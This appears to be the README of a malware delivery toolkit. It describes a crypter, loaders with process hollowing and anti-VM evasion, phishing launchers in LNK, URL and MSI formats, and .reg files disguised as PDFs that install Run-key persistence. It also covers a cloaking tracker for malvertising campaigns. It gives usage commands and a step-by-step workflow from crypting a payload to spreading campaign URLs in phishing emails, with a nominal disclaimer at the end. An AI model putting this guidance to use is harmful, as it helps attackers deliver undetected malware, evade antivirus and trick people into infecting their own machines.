# FUD Tools Suite

Complete toolkit for creating fully undetectable (FUD) malware delivery systems.

## 🎯 Components

### 1. **FUD Loader** (`fud_loader.py`)
Generates FUD loaders in multiple formats.

**Formats:**
- `.exe` - Executable loader
- `.msi` - Windows Installer package

**Features:**
- ✅ Runtime FUD
- ✅ Scan-time FUD
- ✅ Chrome download compatible
- ✅ XOR encrypted payloads
- ✅ Anti-VM detection
- ✅ Anti-Sandbox checks
- ✅ Process hollowing injection

**Usage:**
```bash
python fud_loader.py payload.exe exe
python fud_loader.py payload.exe msi
python fud_loader.py payload.exe both
```

---

### 2. **FUD Launcher** (`fud_launcher.py`)
Creates phishing-optimized launchers in all major formats.

**Formats:**
- `.msi` - Windows Installer
- `.msix` - Modern app package
- `.url` - Internet shortcut
- `.lnk` - Windows shortcut (perfect for email)
- `.exe` - Executable downloader

**Features:**
- ✅ FUD across all formats
- ✅ Ideal for phishing (LNK/URL)
- ✅ Social engineering optimized
- ✅ Multiple delivery vectors
- ✅ Hidden execution

**Usage:**
```bash
# Single format
python fud_launcher.py http://example.com/payload.exe lnk
python fud_launcher.py http://example.com/payload.exe url

# Complete phishing kit (all formats)
python fud_launcher.py http://example.com/payload.exe kit
```

**Phishing Vectors:**
- **LNK**: Email attachments (highest open rate)
- **URL**: One-click delivery
- **MSI**: High trust installer
- **MSIX**: Modern Windows apps
- **EXE**: Traditional download

---

### 3. **FUD Crypter** (`fud_crypter.py`)
Advanced crypter with multi-layer encryption.

**Formats:**
- `.exe`, `.msi`, `.msix`, `.url`, `.lnk`

**Features:**
- ✅ Advertised as FUD
- ✅ Supports all delivery vectors
- ✅ Multi-layer encryption (3 layers)
- ✅ Polymorphic code
- ✅ Anti-VM + Anti-debugger
- ✅ High entropy obfuscation

**Usage:**
```bash
python fud_crypter.py payload.exe exe
python fud_crypter.py malware.exe msi
```

**Encryption Layers:**
1. XOR encryption
2. AES encryption
3. RC4 encryption
4. Polymorphic transformations

---

### 4. **Registry Spoofer** (`reg_spoofer.py`)
Disguises .reg files as legitimate documents.

**Formats:**
- `.pdf` - PDF document
- `.txt` - Text file
- `.png` - Image file
- `.mp4` - Video file

**Features:**
- ✅ Custom pop-up text (editable)
- ✅ PDF/document content editable
- ✅ Registry persistence on reboot
- ✅ Instant download + execute on file open
- ✅ Custom warning messages at end

**How it works:**
1. User opens spoofed file (appears as PDF/TXT/PNG/MP4)
2. Custom pop-up displays
3. Decoy file opens (shows editable content)
4. Registry persistence installed (silent)
5. Payload executes (hidden)
6. Custom warning pop-up at end
7. Payload auto-runs on next system reboot

**Usage:**
```bash
# Basic usage
python reg_spoofer.py payload.exe pdf

# With custom messages
python reg_spoofer.py payload.exe pdf \
  --title "Adobe Reader" \
  --message "Loading document..." \
  --warning "Restart required to view full document" \
  --content "This is a secure encrypted document."

# Other formats
python reg_spoofer.py payload.exe txt --title "Notepad"
python reg_spoofer.py payload.exe png --title "Photo Viewer"
python reg_spoofer.py payload.exe mp4 --title "Media Player"
```

**Registry Persistence:**
- HKCU\...\RunOnce - One-time execution on boot
- HKCU\...\Run - Persistent execution every boot
- Survives system restarts

---

### 5. **Auto-Crypt Panel** (`crypt_panel.py`)
Web-based panel for automatic batch crypting.

**Features:**
- 🌐 Web interface (http://localhost:5001)
- 📦 Batch processing queue
- 🔑 API key authentication
- 📊 Real-time statistics
- 📥 Automatic file processing
- 📈 FUD score tracking

**Usage:**
```bash
python crypt_panel.py
```

Then open: `http://localhost:5001`

**API Endpoints:**
- `POST /api/generate-key` - Generate API key
- `POST /api/crypt` - Upload and crypt file
- `GET /api/jobs` - List all jobs
- `GET /api/job/<id>` - Get job status
- `GET /api/download/<id>` - Download crypted file
- `GET /api/stats` - Get statistics

**API Example:**
```bash
# Generate key
curl -X POST http://localhost:5001/api/generate-key

# Upload and crypt
curl -X POST http://localhost:5001/api/crypt \
  -H "X-API-Key: YOUR_KEY" \
  -F "file=@payload.exe" \
  -F "output_format=exe"
```

---

### 6. **Cloaking + Redirect Tracker** (`cloaking_tracker.py`)
Advanced traffic cloaking with real-time tracking.

**Features:**
- 🌍 Geo/IP cloaking
- 📍 Click tracking
- 🤖 Bot filtering
- 📱 Telegram bot stats
- 🚫 Country/IP blocking
- 📊 Real-time analytics

**Use Case:**
Malvertising or phishing campaigns with real-time feedback

**Usage:**
```bash
python cloaking_tracker.py
```

Then open: `http://localhost:5002`

**Cloaking Rules:**
- ✅ Allow/block specific countries
- ✅ Allow/block specific IPs
- ✅ Bot detection and handling
- ✅ Automatic geo-targeting
- ✅ Decoy redirection

**Telegram Integration:**
1. Create bot with @BotFather
2. Get bot token
3. Get chat ID
4. Set in code:
```python
TELEGRAM_BOT_TOKEN = "your_token"
TELEGRAM_CHAT_ID = "your_chat_id"
```

**Campaign Creation:**
```bash
# Via web panel at http://localhost:5002

# Or via API:
curl -X POST http://localhost:5002/api/campaign/create \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Campaign 1",
    "target_url": "http://malicious.com/payload.exe",
    "decoy_url": "https://google.com",
    "allowed_countries": "US,UK,CA",
    "blocked_countries": "CN,RU",
    "bot_action": "decoy"
  }'
```

**Campaign URL:**
```
http://localhost:5002/c/CAMPAIGN_ID
```

Use this URL in phishing emails, ads, etc. Visitors will be automatically cloaked based on rules.

---

## 🚀 Quick Start

### Installation

```bash
# Install requirements
pip install flask flask-cors requests pycryptodome

# Or use requirements file
pip install -r requirements.txt
```

### Complete Workflow Example

**1. Create Payload:**
```bash
# Start with your payload
cp /path/to/malware.exe payload.exe
```

**2. Crypt Payload:**
```bash
# Crypt with FUD crypter
python fud_crypter.py payload.exe exe

# Output: output/crypted/payload_crypted.exe
```

**3. Create Launcher:**
```bash
# Create phishing launcher kit
python fud_launcher.py http://yourserver.com/payload_crypted.exe kit

# Output: Multiple formats in output/launchers/
```

**4. Setup Cloaking:**
```bash
# Start cloaking tracker
python cloaking_tracker.py

# Create campaign in web panel
# Use campaign URL for distribution
```

**5. Monitor:**
```bash
# Track clicks in real-time at http://localhost:5002
# Receive Telegram notifications for each click
```

---

## 📊 FUD Techniques Used

### Anti-Detection
- Multi-layer encryption (XOR, AES, RC4)
- Polymorphic code generation
- High entropy obfuscation
- String encryption
- API hashing

### Anti-Analysis
- Anti-VM detection (CPUID, registry, processes)
- Anti-debugger checks (IsDebuggerPresent, CheckRemoteDebugger)
- Time-based evasion
- Mouse movement detection
- Sandbox detection

### Execution Methods
- Process hollowing
- DLL injection
- Registry RunOnce/Run persistence
- VBScript wrappers
- PowerShell downloaders

### Obfuscation
- RLO (Right-to-Left Override) filename spoofing
- Icon spoofing
- File signature manipulation
- Misleading extensions

---

## 🔒 Security Considerations

**Legal Use Only:**
- ✅ Security research
- ✅ Penetration testing (authorized)
- ✅ Red team operations
- ✅ Malware analysis
- ❌ Unauthorized access
- ❌ Distribution of malware
- ❌ Criminal activity

**Responsible Disclosure:**
- Test in isolated environments only
- Obtain proper authorization
- Report vulnerabilities responsibly
- Follow local laws and regulations

---

## 📁 File Structure

```
FUD-Tools/
├── fud_loader.py           # FUD loader generator
├── fud_launcher.py         # Multi-format launcher
├── fud_crypter.py          # Advanced crypter
├── reg_spoofer.py          # Registry file spoofer
├── crypt_panel.py          # Auto-crypt web panel
├── cloaking_tracker.py     # Cloaking + tracking system
├── requirements.txt        # Python dependencies
├── README.md               # This file
└── output/                 # Generated files
    ├── loaders/
    ├── launchers/
    ├── crypted/
    └── spoofed/
```

---

## 🛠️ Requirements

**System:**
- Python 3.8+
- Windows (for compilation)
- MinGW-w64 (for C++ compilation)
- WiX Toolset (for MSI generation)

**Python Packages:**
```
Flask==3.0.0
Flask-Cors==4.0.0
requests==2.31.0
pycryptodome==3.19.0
```

**Optional Tools:**
- MinGW-w64: `apt-get install mingw-w64`
- WiX Toolset: https://wixtoolset.org/
- Windows SDK (for MSIX signing)

---

## 📞 Support

For issues or questions:
1. Check documentation
2. Review error logs
3. Test with EICAR test file
4. Verify all dependencies installed

---

## ⚠️ Disclaimer

This toolkit is for **educational and authorized security testing purposes only**.

- Always obtain proper authorization before testing
- Use in isolated/sandboxed environments
- Follow all applicable laws and regulations
- Report vulnerabilities responsibly
- Do not use for malicious purposes

**The authors are not responsible for misuse of these tools.**

---

**Built for the security research community** 🛡️
